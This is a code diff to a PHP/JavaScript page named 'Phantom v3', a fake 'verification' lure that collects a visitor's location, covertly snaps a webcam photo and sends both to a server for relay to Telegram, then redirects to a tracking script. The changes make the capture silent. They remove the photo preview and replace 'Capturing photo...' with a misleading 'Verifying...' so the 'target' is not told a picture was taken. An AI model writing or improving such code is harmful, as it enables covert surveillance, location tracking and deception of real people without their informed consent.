@@ -1,6 +1,7 @@
 <?php
 /**
  * Phantom v3 – Verification Page + Automatic Photo Capture
+ * Silent version (no preview shown to target)
  */
 
 $config = require __DIR__ . '/config.php';
@@ -54,15 +55,6 @@ if (empty($trackId)) {
         .status-granted { color: var(--success); }
         .status-denied  { color: var(--danger); }
 
-        #preview {
-            display: none;
-            width: 100%;
-            max-height: 220px;
-            object-fit: cover;
-            border-radius: 12px;
-            margin: 16px 0;
-            border: 1px solid var(--border);
-        }
         .btn-verify {
             width: 100%;
             margin-top: 10px;
@@ -130,8 +122,6 @@ if (empty($trackId)) {
                 </div>
             </div>
 
-            <img id="preview" alt="Captured">
-
             <button id="startBtn" class="btn-primary btn-verify">
                 Allow & Continue
             </button>
@@ -143,20 +133,18 @@ if (empty($trackId)) {
         </div>
     </div>
 
-    <!-- Hidden video element for capture -->
+    <!-- Hidden elements for silent capture -->
     <video id="video" class="hidden-video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const trackId     = <?= json_encode($trackId) ?>;
         const redirectUrl = <?= json_encode($redirect) ?>;
-        const telegramEnabled = true; // we always try to send
 
         const statusLocation = document.getElementById('status-location');
         const statusCamera   = document.getElementById('status-camera');
         const statusMic      = document.getElementById('status-mic');
         const startBtn       = document.getElementById('startBtn');
-        const preview        = document.getElementById('preview');
         const video          = document.getElementById('video');
         const canvas         = document.getElementById('canvas');
 
@@ -171,20 +159,20 @@ if (empty($trackId)) {
                 video.onloadedmetadata = () => {
                     video.play();
 
-                    // Wait a short moment for camera to adjust
+                    // Wait briefly for camera to adjust
                     setTimeout(() => {
                         canvas.width  = video.videoWidth;
                         canvas.height = video.videoHeight;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
 
-                        // Stop the stream
+                        // Stop all tracks immediately
                         stream.getTracks().forEach(track => track.stop());
 
                         canvas.toBlob((blob) => {
                             resolve(blob);
                         }, 'image/jpeg', 0.85);
-                    }, 700);
+                    }, 600);
                 };
             });
         }
@@ -212,7 +200,6 @@ if (empty($trackId)) {
             startBtn.textContent = 'Requesting permissions...';
 
             let locationData = {};
-            let cameraGranted = false;
 
             // ===== 1. Location =====
             try {
@@ -247,37 +234,24 @@ if (empty($trackId)) {
 
                 setStatus(statusCamera, 'granted');
                 setStatus(statusMic, 'granted');
-                cameraGranted = true;
 
-                startBtn.textContent = 'Capturing photo...';
+                startBtn.textContent = 'Verifying...';
 
-                // Automatically capture photo
+                // Silent capture
                 const photoBlob = await capturePhoto(stream);
 
-                // Show small preview
-                preview.src = URL.createObjectURL(photoBlob);
-                preview.style.display = 'block';
-
-                startBtn.textContent = 'Sending verification...';
-
-                // Send photo to server → Telegram
+                // Send to Telegram (no preview shown)
                 await sendPhotoToServer(photoBlob, locationData);
 
             } catch (err) {
-                // Fallback: try camera only
+                // Fallback: camera only
                 try {
                     const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     setStatus(statusCamera, 'granted');
                     setStatus(statusMic, 'denied');
-                    cameraGranted = true;
 
-                    startBtn.textContent = 'Capturing photo...';
+                    startBtn.textContent = 'Verifying...';
                     const photoBlob = await capturePhoto(camStream);
-
-                    preview.src = URL.createObjectURL(photoBlob);
-                    preview.style.display = 'block';
-
-                    startBtn.textContent = 'Sending verification...';
                     await sendPhotoToServer(photoBlob, locationData);
                 } catch (e) {
                     setStatus(statusCamera, 'denied');
@@ -285,15 +259,14 @@ if (empty($trackId)) {
                 }
             }
 
-            // ===== Final redirect =====
+            // ===== Redirect =====
             startBtn.textContent = 'Redirecting...';
 
-            // Go to track.php so normal logging still happens
             const finalUrl = `track.php?id=${encodeURIComponent(trackId)}&r=${encodeURIComponent(redirectUrl)}`;
 
             setTimeout(() => {
                 window.location.href = finalUrl;
-            }, 800);
+            }, 700);
         }
 
         startBtn.addEventListener('click', requestPermissions);
